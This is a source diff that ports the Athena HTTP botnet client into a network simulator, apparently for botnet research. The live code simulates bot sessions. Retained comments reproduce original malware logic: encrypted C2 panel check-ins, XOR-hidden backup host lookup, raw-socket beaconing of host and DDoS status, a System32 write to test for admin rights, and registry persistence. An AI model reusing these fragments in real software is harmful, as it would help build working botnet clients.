@@ -17,9 +17,9 @@
 
 namespace inet {
 
-namespace simbo {
-
 Define_Module(AthenaBot);
+
+//namespace athena {
 
 AthenaBot::AthenaBot()
 {
@@ -33,24 +33,107 @@ AthenaBot::AthenaBot()
 
 AthenaBot::~AthenaBot()
 {
-
+    // @todo Delete socket data structures
+    sockCollection.deleteSockets();
 }
 
 void AthenaBot::initialize(int stage)
 {
     EV_INFO << "Initializing Athena bot component, stage " << stage << endl;
+    //addGate("ethg", cGate::OUTPUT)->connectTo(getSimulation()->getModule());
     std::string hostName = "Host " + this->getIndex();
     this->setName(hostName.c_str());
-    GenericBot::initialize(stage);
-    if (stage == INITSTAGE_LOCAL && infectedHost) {
+    HttpBrowserBase::initialize(stage);
+
+    if (stage == INITSTAGE_LOCAL) {
+        cXMLElement *rootelement = par("config").xmlValue();
+        if (rootelement == nullptr)
+            throw cRuntimeError("Configuration file is not defined");
+
+        cXMLAttributeMap attributes;
+        httptools::rdObjectFactory rdFactory;
+
+        // Activity bot period length -- the waking period
+        cXMLElement *element = rootelement->getFirstChildWithTag("botActivityPeriod");
+        if (element == nullptr) {
+            rdBotActivityLength = nullptr;    // Disabled if this parameter is not defined in the file
+        }
+        else {
+            attributes = element->getAttributes();
+            rdBotActivityLength = rdFactory.create(attributes);
+            if (rdBotActivityLength == nullptr)
+                throw cRuntimeError("Bot Activity period random object could not be created");
+        }
+
+        // Inter-session interval
+        element = rootelement->getFirstChildWithTag("botInterSessionInterval");
+        if (element == nullptr)
+            throw cRuntimeError("Bot Inter-request interval parameter undefined in XML configuration");
+        attributes = element->getAttributes();
+        rdBotInterSessionInterval = rdFactory.create(attributes);
+        if (rdBotInterSessionInterval == nullptr)
+            throw cRuntimeError("Bot Inter-session interval random object could not be created");
+
+        // Requests in session
+        element = rootelement->getFirstChildWithTag("botReqInSession");
+        if (element == nullptr)
+            throw cRuntimeError("requests in session parameter undefined in XML configuration");
+        attributes = element->getAttributes();
+        rdBotReqInSession = rdFactory.create(attributes);
+        if (rdBotReqInSession == nullptr)
+            throw cRuntimeError("Bot Requests in session random object could not be created");
+
+        // Infected host
+        isInfected = par("infected").boolValue();
+        botMessage = new cMessage("Bot Message");
+    }
+    else if (stage == INITSTAGE_APPLICATION_LAYER && isInfected) {
         EV_INFO << "Initializing Athena bot component -- phase 1\n";
-        double activationTime = par("botActivationTime");
-        pingTime = par("botPingTime");
+
+        // No scripted mode yet
+        /*
+        std::string scriptFile = par("scriptFile").stdstringValue();
+        scriptedMode = !scriptFile.empty();
+        if (scriptedMode) {
+            EV_INFO << "Scripted mode. Script file: " << scriptFile << endl;
+            readScriptedEvents(scriptFile.c_str());
+        }
+        else {
+            double activationTime = par("activationTime");    // This is the activation delay. Optional
+            if (rdActivityLength != nullptr)
+                activationTime += (86400.0 - rdActivityLength->draw()) / 2; // First activate after half the sleep period
+            EV_INFO << "Initial activation time is " << activationTime << endl;
+            eventTimer->setKind(MSGKIND_ACTIVITY_START);
+            scheduleAt(simTime() + (simtime_t)activationTime, eventTimer);
+        }
+        */
+        double activationTime = par("botActivationTime"); // Activation delay for the bot. Optional
+        if (rdBotActivityLength != nullptr)
+            activationTime += (86400.0 - rdBotActivityLength->draw()) / 2; // First activate after half the sleep period
         EV_INFO << "Initial activation time is " << activationTime << endl;
         cServer = par("serverName").stringValue();
         botMessage->setKind(MSGKIND_ACTIVITY_BOT_START);
         scheduleAt(simTime() + (simtime_t)activationTime, botMessage);
     }
+}
+
+void AthenaBot::socketDataArrived(int connId, void *yourPtr, cPacket *msg, bool urgent)
+{
+    EV_INFO << "Socket data arrived on connection " << connId << ": " << msg->getName() << endl;
+    if (yourPtr == nullptr) {
+        EV_ERROR << "socketDataArrivedfailure. Null pointer" << endl;
+        return;
+    }
+
+    SockData *sockdata = (SockData *)yourPtr;
+    TCPSocket *socket = sockdata->socket;
+    handleDataMessage(msg);
+
+    if (--sockdata->pending == 0) {
+        EV_INFO << "Received last expected reply on this socket. Issuing a close" << endl;
+        socket->close();
+    }
+    // Message deleted in handler - do not delete here!
 }
 
 void AthenaBot::handleMessage(cMessage *msg)
@@ -60,7 +143,27 @@ void AthenaBot::handleMessage(cMessage *msg)
     }
     else {
         EV_INFO << "Message received: " << msg->getName() << endl;
-        handleDataMessage(msg);
+
+        TCPCommand *ind = dynamic_cast<TCPCommand *>(msg->getControlInfo());
+        if (!ind) {
+            EV_INFO << "No control info for the message" << endl;
+        }
+        else {
+            int connId = ind->getConnId();
+            EV_INFO << "Connection ID: " << connId << endl;
+        }
+
+        // Locate the socket for the incoming message. One should definitely exist.
+        TCPSocket *socket = sockCollection.findSocketFor(msg);
+        if (socket == nullptr) {
+            // Handle errors. @todo error instead of warning?
+            EV_WARN << "No socket found for message " << msg->getName() << endl;
+            delete msg;
+            return;
+        }
+        // Submit to the socket handler. Calls the TCPSocket::CallbackInterface methods.
+        // Message is deleted in the socket handler
+        socket->processMessage(msg);
     }
 }
 
@@ -70,6 +173,7 @@ void AthenaBot::handleDataMessage(cMessage *msg)
     if (appmsg == nullptr)
         throw cRuntimeError("Message (%s)%s is not a valid reply message", msg->getClassName(), msg->getName());
 
+    logResponse(appmsg);
     EV_INFO << "Message data: " << appmsg->payload() << endl;
     delete appmsg;
     return;
@@ -78,6 +182,22 @@ void AthenaBot::handleDataMessage(cMessage *msg)
 void AthenaBot::handleSelfMessages(cMessage *msg)
 {
     switch (msg->getKind()) {
+        case MSGKIND_ACTIVITY_START:
+            //handleSelfActivityStart();
+            break;
+
+        case MSGKIND_START_SESSION:
+            //handleSelfStartSession();
+            break;
+
+        case MSGKIND_NEXT_MESSAGE:
+            //handleSelfNextMessage();
+            break;
+
+        case MSGKIND_SCRIPT_EVENT:
+            handleSelfScriptedEvent();
+            break;
+
         case MSGKIND_ACTIVITY_BOT_START:
             handleSelfActivityBotStart();
             break;
@@ -94,6 +214,10 @@ void AthenaBot::handleSelfMessages(cMessage *msg)
             handleSelfBotResponseSession();
             break;
 
+        case HTTPT_DELAYED_REQUEST_MESSAGE:
+            //handleSelfDelayedRequestMessage(msg);
+            break;
+
     }
 }
 
@@ -101,12 +225,23 @@ void AthenaBot::handleSelfActivityBotStart()
 {
     EV_INFO << "Starting new activity bot period @ T=" << simTime() << endl;
     botMessage->setKind(MSGKIND_BOT_START_SESSION);
-    scheduleAt(simTime() + (simtime_t) 1, botMessage);
+    messagesInCurrentSession = 0;
+    reqNoInCurSession = 0;
+    isInfected = true;
+    double activityPeriodLength = rdBotActivityLength->draw();    // Get the length of the activity period
+    acitivityPeriodEnd = simTime() + activityPeriodLength;    // The end of the activity period
+    EV_INFO << "Activity bot period starts @ T=" << simTime() << ". Activity period is " << activityPeriodLength / 3600 << " hours." << endl;
+    scheduleAt(simTime() + (simtime_t)rdBotInterSessionInterval->draw() / 2, botMessage);
 }
 
 void AthenaBot::handleSelfBotStartSession()
 {
     EV_INFO << "Starting new bot session @ T=" << simTime() << endl;
+    sessionCount++;
+    messagesInCurrentSession = 0;
+    reqInCurSession = 0;
+    reqNoInCurSession = (int)rdBotReqInSession->draw();
+    EV_INFO << "Starting session # " << sessionCount << " @ T=" << simTime() << ". Requests in session are " << reqNoInCurSession << "\n";
     int nextMsgType = ConnectToHttp();
     scheduleNextBotEvent(nextMsgType);
 }
@@ -115,7 +250,7 @@ void AthenaBot::handleSelfBotRepeatSession()
 {
     if (IsAdmin()) {
         EV_INFO << "Host " << this->getIndex() << "was restarted!";
-        infectedHost = false;
+        isInfected = false;
         scheduleNextBotEvent(on_exec);
         return;
     }
@@ -141,6 +276,14 @@ void AthenaBot::handleSelfBotRepeatSession()
 
     char cHttpPath[DEFAULT];
     memset(cHttpPath, 0, sizeof(cHttpPath));
+    char szModuleName[127];
+    int connectPort;
+
+    if (controller->getServerInfo(cServer, szModuleName, connectPort) != 0) {
+        EV_ERROR << "Unable to get server information from controller" << endl;
+        nextMsgType = on_exec;
+    }
+    EV_INFO << "Sending request to server " << cServer << " (" << szModuleName << ") on port " << connectPort << endl;
 
     char cBreakUrl[strlen(cServer)];
     memset(cBreakUrl, 0, sizeof(cBreakUrl));
@@ -163,7 +306,7 @@ void AthenaBot::handleSelfBotRepeatSession()
 
     strcpy(cHttpHostGlobal, cHttpHost);
     strcpy(cHttpPathGlobal, cHttpPath);
-    if (!SendPanelRequest(cHttpHost, cHttpPath, usPort, cDataToServer))
+    if (!SendPanelRequest(httpreq, cHttpHost, cHttpPath, usPort, cDataToServer))
         nextMsgType = repeat;
     else
         nextMsgType = on_exec;
@@ -186,19 +329,68 @@ void AthenaBot::scheduleNextBotEvent(int msgType)
     case response: EV_INFO << "response" << endl; botMessage->setKind(MSGKIND_BOT_RESPONSE_SESSION); break;
     default: EV_ERROR << "Type not defined" << endl;
     }
-    scheduleAt(simTime() + (simtime_t) pingTime, botMessage);
+    scheduleAt(simTime() + (simtime_t) (simtime_t)rdBotInterSessionInterval->draw() / 2, botMessage);
 }
 
 
 int AthenaBot::ConnectToHttp()
 {
     RunThroughUuidProcedure();
+    cModule *targetModule = getParentModule()->getSubmodule("HTTPModule", 1);
+    simbo::HTTPModule *browser = check_and_cast<simbo::HTTPModule *>(targetModule);
+    std::string url = "", body = "";
+    Enter_Method_Silent();
+    /* Athena debug info
+#ifdef DEBUG
+    //if(usPort > nPortOffset)
+    //    usPort -= nPortOffset;
+    //else
+    //    usPort += nPortOffset;
+
+    SimpleDynamicXor(cBackup, usVersionLength + usServerLength + usChannelLength + usAuthHostLength);
+
+    printf("%s\n"
+            "-----------\n"
+            "URL to gate.php: %s\n"
+            "Backup: %s\n"
+            "Port: %i\n"
+            "Extra Data:\n%s %s %s %s\n%s %s %s %s %s %s %s\n"
+            "%s\n", cVersion, cServer, cBackup, usPort, cServerPass, cChannel, cChannelKey, cAuthHost,
+            cIrcCommandPrivmsg, cIrcCommandJoin, cIrcCommandPart, cIrcCommandUser, cIrcCommandNick, cIrcCommandPass, cIrcCommandPong, cUuid);
+
+    //if(usPort < nPortOffset)
+    //    usPort += nPortOffset;
+    //else
+    //    usPort -= nPortOffset;
+
+    SimpleDynamicXor(cBackup, usVersionLength + usServerLength + usChannelLength + usAuthHostLength);
+
+    system("pause");
+#endif
+     */
 
     // <!-------! CRC AREA START !-------!>
     if(!bConfigSetupCheckpointSeven)
         usPort = GetRandNum(100) + 1;
     // <!-------! CRC AREA STOP !-------!>
 
+    /* UUID definition -- from hardware
+     *
+     */
+     /* HW_PROFILE_INFO HwProfInfo;
+        while(!fncGetCurrentHwProfile(&HwProfInfo))
+            Sleep(100);
+
+        char cGuid[40];
+        memset(cGuid, 0, sizeof(cGuid));
+        strcpy(cGuid, HwProfInfo.szHwProfileGuid);
+        StripDashes(cGuid);
+
+        memset(cUuid, 0, sizeof(cUuid));
+        memcpy(cUuid, cGuid + 1, 36);*/
+
+    // bUninstallProgram -- don't needed (currently, not supported)
+    //while(!bUninstallProgram)
     {
         // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>
         time_t tTime;
@@ -221,6 +413,7 @@ int AthenaBot::ConnectToHttp()
             strcpy(cPrivelages, "user");
 
         char cBits[3];
+        //if(Is64Bits(GetCurrentProcess()))
         if (Is64Bits())
             strcpy(cBits, "64");
         else
@@ -253,6 +446,14 @@ int AthenaBot::ConnectToHttp()
 
         char cHttpPath[DEFAULT];
         memset(cHttpPath, 0, sizeof(cHttpPath));
+        char szModuleName[127];
+        int connectPort;
+
+        if (controller->getServerInfo(cServer, szModuleName, connectPort) != 0) {
+            EV_ERROR << "Unable to get server information from controller" << endl;
+            return on_exec;
+        }
+        EV_INFO << "Sending request to server " << cServer << " (" << szModuleName << ") on port " << connectPort << endl;
 
         char cBreakUrl[strlen(cServer)];
         memset(cBreakUrl, 0, sizeof(cBreakUrl));
@@ -276,11 +477,109 @@ int AthenaBot::ConnectToHttp()
         strcpy(cHttpHostGlobal, cHttpHost);
         strcpy(cHttpPathGlobal, cHttpPath);
 
+        /**
+         * Maybe not needed!
+         */
+        /*
+        //httpreq.sin_port = fnchtons(usPort);
+        httpreq.sin_port = usPort; // Little-endian!
+        httpreq.sin_family = AF_INET;
+
+        HOSTENT *paddr;
+
+        unsigned short usHostResolves = 1;
+        do
         {
-            if(SendPanelRequest(cHttpHost, cHttpPath, usPort, cDataToServer))
-                return on_exec;
+            usHostResolves++;
+
+            if(usHostResolves % 2 == 0)
+                paddr = fncgethostbyname(cHttpHost);
+            else if(cBackup != NULL)
+            {
+                SimpleDynamicXor(cBackup, usVersionLength + usServerLength + usChannelLength + usAuthHostLength);
+                paddr = fncgethostbyname(cBackup);
+                SimpleDynamicXor(cBackup, usVersionLength + usServerLength + usChannelLength + usAuthHostLength);
+            }
+            else
+                continue;
+
+            if(paddr == NULL)
+            {
+#ifdef DEBUG
+if(usHostResolves % 2 == 0)
+    printf("ERROR: Failed to resolve primary host! Trying backup host in 5 seconds...\n");
+else if(cBackup != NULL)
+    printf("ERROR: Failed to resolve backup host! Trying primary host in 5 seconds...\n");
+#endif
+//Sleep(5000);
+            }
         }
-    }
+        while(paddr == NULL);
+
+        memcpy(&httpreq.sin_addr.s_addr, paddr->h_addr, paddr->h_length);
+        */
+        /*
+#ifdef DEBUG
+        printf("-----------\n"
+                "Communication Information:\n"
+                "DNS: %s ( %s", cHttpHost, fncinet_ntoa(httpreq.sin_addr));
+#ifdef USE_ENCRYPTED_IP
+        httpreq.sin_addr.s_addr = fncinet_addr(DecryptIp(fncinet_ntoa(httpreq.sin_addr), 24));
+        printf("[encrypted] -> %s[decrypted]", fncinet_ntoa(httpreq.sin_addr));
+#endif
+        printf(" )\n"
+                "Path: %s\n"
+                "Port: %i\n", cHttpPath, usPort);
+#endif
+         */
+        //while(!bUninstallProgram)
+        {
+            if(SendPanelRequest(httpreq, cHttpHost, cHttpPath, usPort, cDataToServer))
+                //break;
+                return on_exec;
+
+            //Sleep(5000);
+            // Time to schedule next event -- problems? (httpreq, cHttpHost, cHttpPath, usPort must be global
+            // next event? -- maybe a global to define
+            //Sleep(nCheckInInterval * 1000);
+        }
+
+        // Schedule next event
+        //while(!bUninstallProgram)
+        /*
+        {
+            memset(cDataToServer, 0, sizeof(cDataToServer));
+
+            char cBusy[7];
+            memset(cBusy, 0, sizeof(cBusy));
+            if(bDdosBusy)
+                strcpy(cBusy, "true");
+            else
+                strcpy(cBusy, "false");
+
+            sprintf(cDataToServer, "|type:repeat|uid:%s|ram:%ld|bk_killed:%i|bk_files:%i|bk_keys:%i|busy:%s|",
+                    cUuid, GetMemoryLoad(), dwKilledProcesses, dwFileChanges, dwRegistryKeyChanges, cBusy);
+
+            if(!SendPanelRequest(httpreq, cHttpHost, cHttpPath, usPort, cDataToServer))
+            {
+                if(bHttpRestart)
+                    break;
+
+                //Sleep(5000);
+                return repeat;
+                //Sleep(nCheckInInterval * 1000);
+                //continue;
+            }
+
+            if(bHttpRestart)
+                break;
+
+            //Sleep(5000);
+            return repeat;
+            //Sleep(nCheckInInterval * 1000);
+        }
+    */}
+    //UninstallProgram();
     return repeat;
 }
 
@@ -306,6 +605,7 @@ void AthenaBot::fncUuidCreate(UUID *uuid)
 
 void AthenaBot::fncUuidToString(UUID *uuid, char *uuidString)
 {
+    //uuidString = (char *) malloc(44);
     sprintf(uuidString, "%lX-%hX-%hX-%hhX%hhX-%hhX%hhX%hhX%hhX%hhX%hhX", uuid->Data1, uuid->Data2, uuid->Data3,
             uuid->Data4[0], uuid->Data4[1], uuid->Data4[2], uuid->Data4[3], uuid->Data4[4],
             uuid->Data4[5], uuid->Data4[6], uuid->Data4[7]);
@@ -335,6 +635,13 @@ void AthenaBot::StripDashes(char *pcString)
  */
 unsigned int AthenaBot::GetMemoryLoad()
 {
+    /*
+    MEMORYSTATUS mStatus;
+    ZeroMemory(&mStatus, sizeof(mStatus));
+    mStatus.dwLength = sizeof(mStatus);
+    GlobalMemoryStatus(&mStatus);
+    DWORD dwLoad = (DWORD)(mStatus.dwMemoryLoad);
+    */
     std::default_random_engine generator(simTime().dbl());
     std::uniform_int_distribution<DWORD> distribution;
     unsigned int dwLoad = distribution(generator);
@@ -343,12 +650,55 @@ unsigned int AthenaBot::GetMemoryLoad()
 
 char *AthenaBot::GetVersionMicrosoftDotNetVersion()
 {
+    /*
+    char cPath[DEFAULT];
+    for(unsigned short us = 0; us < 4; us++)
+    {
+        sprintf(cPath, "%s\\Microsoft.NET\\Framework\\", cWindowsDirectory);
+
+        if(us == 0)
+            strcat(cPath, "v4.0.30319");
+        else if(us == 1)
+            strcat(cPath, "v3.5");
+        else if(us == 2)
+            strcat(cPath, "v3.0");
+        else if(us == 3)
+            strcat(cPath, "v2.0.50727");
+
+        if(DirectoryExists(cPath))
+        {
+            if(us == 0)
+                return (char*)"4.0";
+            else if(us == 1)
+                return (char*)"3.5";
+            else if(us == 2)
+                return (char*)"3.0";
+            else if(us == 3)
+                return (char*)"2.0";
+        }
+    }
+     */
     return (char*)"N/A";
 }
 
 bool AthenaBot::IsAdmin() //Determines if the executable is running as user or admin
 {
     bool bReturn = false;
+
+    /*
+    FILE * pOpenAdminFile;
+    char cAdminFile[45];
+
+    sprintf(cAdminFile, "%s\\System32\\drivers\\etc\\protocol", cWindowsDirectory);
+
+    pOpenAdminFile = fopen(cAdminFile, "a");
+
+    if(pOpenAdminFile != NULL)
+    {
+        bReturn = TRUE;
+        fclose(pOpenAdminFile);
+    }
+    */
 
     // Let the luck decide for us
     std::default_random_engine generator (simTime().dbl());
@@ -363,6 +713,14 @@ bool AthenaBot::Is64Bits()
 {
     bool bReturn = true;
 
+    /*
+    BOOL bIsWow64 = FALSE;
+    if(!fncIsWow64Process(hProcess, &bIsWow64))
+        bReturn = FALSE;
+
+    if(!bIsWow64)
+        bReturn = FALSE;
+     */
     bReturn = IsAdmin();
 
     return bReturn;
@@ -372,6 +730,14 @@ bool AthenaBot::IsLaptop()
 {
     bool bReturn = false;
 
+    /*
+    SYSTEM_POWER_STATUS spsPowerInfo;
+    if(GetSystemPowerStatus(&spsPowerInfo))
+    {
+        if(spsPowerInfo.BatteryFlag < 128)
+            bReturn = TRUE;
+    }
+    */
     bReturn = IsAdmin();
 
     return bReturn;
@@ -381,6 +747,13 @@ unsigned int AthenaBot::GetNumCPUs() //Determines the number of processors on th
 {
     return 1;
 }
+
+/*
+HOSTENT *AthenaBot::fncgethostbyname(char *)
+{
+
+}
+*/
 
 char *AthenaBot::SimpleDynamicXor(char *pcString, DWORD dwKey)
 {
@@ -397,7 +770,7 @@ char *AthenaBot::SimpleDynamicXor(char *pcString, DWORD dwKey)
 /**
  * Hub/HttpUtilities.cpp
  */
-bool AthenaBot::SendPanelRequest(char *cHttpHost, char *cHttpPath, unsigned short usHttpPort, char *cHttpData)
+bool AthenaBot::SendPanelRequest(SOCKADDR_IN httpreq, char *cHttpHost, char *cHttpPath, unsigned short usHttpPort, char *cHttpData)
 {
     bool bReturn = false;
 
@@ -465,6 +838,11 @@ bool AthenaBot::SendPanelRequest(char *cHttpHost, char *cHttpPath, unsigned shor
     memset(cFinalOutKey, 0, sizeof(cFinalOutKey));
     StringToStrongUrlEncodedString(cEncryptedKey, cFinalOutKey);
 
+    //char cCopy[DEFAULT];
+    //memset(cCopy, 0, sizeof(cCopy));
+    //sprintf(cCopy, "%s:%s", cEncryptedData, cEncryptedKey);
+    //CopyToClipboard(cCopy);
+
     char cMarker[26];
     memset(cMarker, 0, sizeof(cMarker));
     char cMarkerBase64[sizeof(cMarker) * 3];
@@ -479,6 +857,7 @@ bool AthenaBot::SendPanelRequest(char *cHttpHost, char *cHttpPath, unsigned shor
     char cHttpContentLength[25];
     memset(cHttpContentLength, 0, sizeof(cHttpContentLength));
     int nPacketDataLength = 2 + strlen(cFinalOutKey) + 3 + strlen(cFinalOutData) + 3 + strlen(cUrlEncodedMarker);
+    //itoa(nPacketDataLength, cHttpContentLength, 10);
     sprintf(cHttpContentLength, "%d", nPacketDataLength);
     strcat(cOutPacket, cHttpContentLength);
     strcat(cOutPacket, cReturnNewline);
@@ -488,18 +867,153 @@ bool AthenaBot::SendPanelRequest(char *cHttpHost, char *cHttpPath, unsigned shor
     memset(cPacketData, 0, sizeof(cPacketData));
     strcpy(cPacketData, "a=");
     strcat(cPacketData, cFinalOutKey);
+    //strcat(cPacketData, cEncryptedKey);
     strcat(cPacketData, "&b=");
     strcat(cPacketData, cFinalOutData);
     strcat(cPacketData, "&c=");
     strcat(cPacketData, cUrlEncodedMarker);
     strcat(cPacketData, "\n");
+    //strcat(cOutPacket, cPacketData);
+//CopyToClipboard(cPacketData);
 
+    /*
+#ifdef DEBUG
+    printf("----------------------\nOutgoing Packet(%i bytes):\n%s\n", strlen(cOutPacket), cOutPacket);
+    printf("-----------\nDecrypted Contents(%i bytes): %s\n", strlen(cHttpData), cHttpData);
+#endif
+     */
     EV_INFO << "----------------------\nOutgoing Packet(" << strlen(cOutPacket) << " bytes):\n" << cOutPacket << std::endl;
     EV_INFO << "-----------\nDecrypted Contents(" << strlen(cHttpData) << " bytes): " << cHttpData << std::endl;
 
-    httpModule = this->getParentModule()->getSubmodule("HTTPModule", 1);
-    HTTPModule *http = check_and_cast<HTTPModule *>(httpModule);
-    http->sendRequestToServer(this, cHttpHost, cOutPacket, cPacketData);
+    /*
+    char cInPacket[MAX_HTTP_PACKET_LENGTH];
+    memset(cInPacket, 0, sizeof(cInPacket));
+
+    char cParsePacket[MAX_HTTP_PACKET_LENGTH];
+    memset(cParsePacket, 0, sizeof(cParsePacket));
+
+    SOCKET sSock = NULL;
+    do
+        sSock = fncsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    while(sSock == INVALID_SOCKET);
+     */
+    long requestLength = strlen(cOutPacket) + strlen(cPacketData);
+    httptools::HttpRequestMessage *msg = new httptools::HttpRequestMessage(cOutPacket);
+    msg->setTargetUrl(cHttpHost);
+    msg->setProtocol(httpProtocol);
+    msg->setHeading(cOutPacket);
+    msg->setPayload(cPacketData);
+    msg->setSerial(0);
+    msg->setByteLength(requestLength);    // Add extra request size if specified
+    msg->setKeepAlive(httpProtocol == 11);
+    msg->setBadRequest(false);    // Simulates willingly requesting a non-existing resource.
+    msg->setKind(HTTPT_REQUEST_MESSAGE);
+
+    sendRequestToServer(msg);
+    /*
+    if(fncconnect(sSock, (PSOCKADDR)&httpreq, sizeof(httpreq)) != SOCKET_ERROR)
+    {
+        int nBytesSent = fncsend(sSock, cOutPacket, strlen(cOutPacket), NULL);
+        if(nBytesSent != SOCKET_ERROR)
+        {
+#ifdef DEBUG
+            printf("----------------------\nPacket successfully sent!(%i bytes)\n", nBytesSent);
+#endif
+            int nReceivedData = fncrecv(sSock, cInPacket, sizeof(cInPacket), NULL);
+
+            strcpy(cParsePacket, cInPacket);
+
+            if(nReceivedData < 1 && strlen(cParsePacket) < 1)
+            {
+#ifdef DEBUG
+                printf("----------------------\nAn error occured! No server response...\n-----------\n");
+#endif
+
+                fncclosesocket(sSock);
+                return FALSE;
+            }
+            else
+            {
+#ifdef DEBUG
+                printf("----------------------\nIncoming Packet(%i bytes):\n%s\n-----------\n", strlen(cParsePacket), cParsePacket);
+#endif
+            }
+        }
+        else
+        {
+#ifdef DEBUG
+            printf("-----------\nFailed to send packet to server\n");
+#endif
+
+            strcpy(cParsePacket, "ERR_FAILED_TO_SEND");
+        }
+    }
+    else
+    {
+#ifdef DEBUG
+        printf("-----------\nFailed to connect to server\n");
+#endif
+
+        strcpy(cParsePacket, "ERR_FAILED_TO_CONNECT");
+    }
+    fncclosesocket(sSock);
+     */
+    /*
+    char *cBreakLine = strtok(cParsePacket, "\n");
+    if(!IsValidHttpResponse(cBreakLine))
+        return bReturn;
+    else
+        bReturn = TRUE;
+
+#ifdef DEBUG
+    printf("Decrypted Contents:\n");
+#endif
+
+    //if(!strstr(cInPacket, cMarkerBase64))
+    if(!strstr(cInPacket, cMarker))
+    {
+#ifdef DEBUG
+        printf("NONE![No Marker]\n");
+#endif
+        return FALSE;
+    }
+
+    //char *cMessageBundle = strstr(cInPacket, cMarkerBase64) + strlen(cMarkerBase64);
+    char *cMessageBundle = strstr(cInPacket, cMarker) + strlen(cMarker);
+
+    if(cMessageBundle == NULL || strstr(cInPacket, "Content-Length: 0"))
+    {
+#ifdef DEBUG
+        printf("NONE![Content-Length: 0]\n");
+#endif
+        return FALSE;
+    }
+    else if(strstr(cMessageBundle, "Location:"))
+    {
+#ifdef DEBUG
+        printf("NONE![LocationReturn]\n");
+#endif
+        bHttpRestart = TRUE;
+        return FALSE;
+    }
+
+    char cDecryptedMessageBundle[MAX_HTTP_PACKET_LENGTH];
+    memset(cDecryptedMessageBundle, 0, sizeof(cDecryptedMessageBundle));
+    DecryptReceivedData(cMessageBundle, cKeyA, cKeyB, cDecryptedMessageBundle);
+
+    cMessageBundle = strtok(cDecryptedMessageBundle, "\n");
+    while(cMessageBundle != NULL)
+    {
+        ParseHttpLine(cMessageBundle);
+
+        if(bHttpRestart)
+            break;
+
+        cMessageBundle = strtok(NULL, "\n");
+    }
+
+    return bReturn;
+    */
 
     return bReturn;
 }
@@ -533,6 +1047,36 @@ void AthenaBot::EncryptSentData(char *cSource, char *cOutputData, char *cOutputE
     strcpy(cOutputRawKeyA, cKeyA);
     strcpy(cOutputRawKeyB, cKeyB);
 
+    /*
+    char cKeyA[KEY_SIZE];
+    memset(cKeyA, 0, sizeof(cKeyA));
+    char cKeyB[KEY_SIZE];
+    memset(cKeyB, 0, sizeof(cKeyB));
+    GeneratestrtrKey(cKeyA, cKeyB);
+
+    char cKey[KEY_SIZE * 2];
+    memset(cKey, 0, sizeof(cKey));
+    sprintf(cKey, "%s:%s", cKeyA, cKeyB);
+
+    char cKeyEncrypted[strlen(cKey) * 3];
+    memset(cKeyEncrypted, 0, sizeof(cKeyEncrypted));
+    //StringToStrongUrlEncodedString(cKey, cKeyEncrypted);
+
+    char cEncrypted[strlen(cSource)];
+    memset(cEncrypted, 0, sizeof(cEncrypted));
+    strcpy(cEncrypted, cSource);
+    strtr(cEncrypted, cKeyA, cKeyB);
+
+    strcpy(cOutputData, cEncrypted);
+    strcpy(cOutputEncryptedKey, cKey);
+    strcpy(cOutputRawKeyA, cKeyA);
+    strcpy(cOutputRawKeyB, cKeyB);
+     */
+    /*
+#ifdef DEBUG
+    printf("----------------------\nEncryption Communication Details:\nKey: %s\nKey StrongUrlEncoded: %s\nData Encrypted(strtr): %s\n", cKey, cKeyEncrypted, cEncrypted);
+#endif
+*/
     EV_INFO << "----------------------\nEncryption Communication Details:\nKey: " << cKey << "\nKey StrongUrlEncoded: " << cKeyEncryptedB << "\nData Encrypted(strtr): " << cEncryptedB << std::endl;
 }
 int AthenaBot::GeneratestrtrKey(char *cOutputA, char *cOutputB)
@@ -625,6 +1169,7 @@ unsigned long AthenaBot::GenerateRandomSeed()
     std::uniform_int_distribution<unsigned long> distribution;
 
     return clock() + time(NULL) + distribution(generator);
+    //return clock() + time(NULL) + _getpid();
 }
 
 /**
@@ -632,10 +1177,16 @@ unsigned long AthenaBot::GenerateRandomSeed()
  */
 char *AthenaBot::GenRandLCText() //Generates random lowercase text
 {
+    //char cLCAlphabet[27];
+    //strcpy(cLCAlphabet, "abcdefghijklmnopqrstuvwxyz");
+
     static char cRandomText[9];
 
     for(unsigned short us = 0; us < 8; us++)
         cRandomText[us] = (char)(GetRandNum(26) + 65 + 32);
+
+    //for(unsigned short us = 0; us < 8; us++)
+    //cRandomText[us] = cLCAlphabet[GetRandNum(strlen(cLCAlphabet))];
 
     return (char*)cRandomText;
 }
@@ -644,6 +1195,7 @@ void AthenaBot::RunThroughUuidProcedure()
 {
     memset(cUuid, 0, sizeof(cUuid));
     UUID uuid;
+    //ZeroMemory(&uuid, sizeof(UUID));
     memset(&uuid, 0, sizeof(UUID));
     fncUuidCreate(&uuid);
 
@@ -653,9 +1205,76 @@ void AthenaBot::RunThroughUuidProcedure()
     strcpy(cUuid, (const char*)ucUuidString);
     fncRpcStringFree(ucUuidString);
     StripDashes(cUuid);
+
+    /* Currently, registry Key is not needed!
+     *
+     */
+    /*
+    char cKeyPath[MAX_PATH];
+    strcpy(cKeyPath, "Software\\");
+    //strcat(cKeyPath, cFileHash);
+
+    if(bNewInstallation)
+    {
+//#ifndef DEBUG
+        /FILE * pFile;
+        pFile = fopen(cFile, "w");
+
+        if(pFile != NULL)
+        {
+            fputs(cUuid, pFile);
+            fclose(pFile);
+        }/
+
+        CreateRegistryKey(HKEY_CURRENT_USER, cKeyPath, cFileHash, cUuid);
+        /if(CreateRegistryKey(HKEY_CURRENT_USER, cKeyPath, cFileHash, cUuid))
+            printf("Successfully created UUID registry key value (UUID=\"%s\")[KeyPath=\"%s\", KeyName=\"%s\"]\n", cUuid, cKeyPath, cFileHash);
+        else
+            printf("Failed to create UUID registry key value\n");
+
+        system("pause");/
+//#endif
+    }
+    else
+    {
+        // char *cFileContents = GetContentsFromFile();
+        //if(!strstr(cFileContents, "-"))
+        //    strcpy(cUuid, cFileContents);
+
+        char *cKeyValue = ReadRegistryKey(HKEY_CURRENT_USER, cKeyPath, cFileHash);
+
+        if(!strstr(cKeyValue, "EFNF") || !strstr(cKeyValue, "NOERRSUC") || !strstr(cKeyValue, "ERROPFA") || strlen(cKeyValue) < 36)
+        {
+            if(strstr(cKeyValue, "\""))
+                cKeyValue = FindInString(cKeyValue, (char*)"\"", (char*)"\"");
+
+            strcpy(cUuid, cKeyValue);
+
+            //printf("Successfully retrieved UUID registry key value (UUID=\"%s\")\n", cUuid);
+        }
+        //else
+        //    printf("Failed to retrieve UUID registry key value\n");
+
+        //system("pause");
+    }
+    */
 }
 unsigned long AthenaBot::GetRandNum(unsigned long range) //Returns a random number within a given range
 {
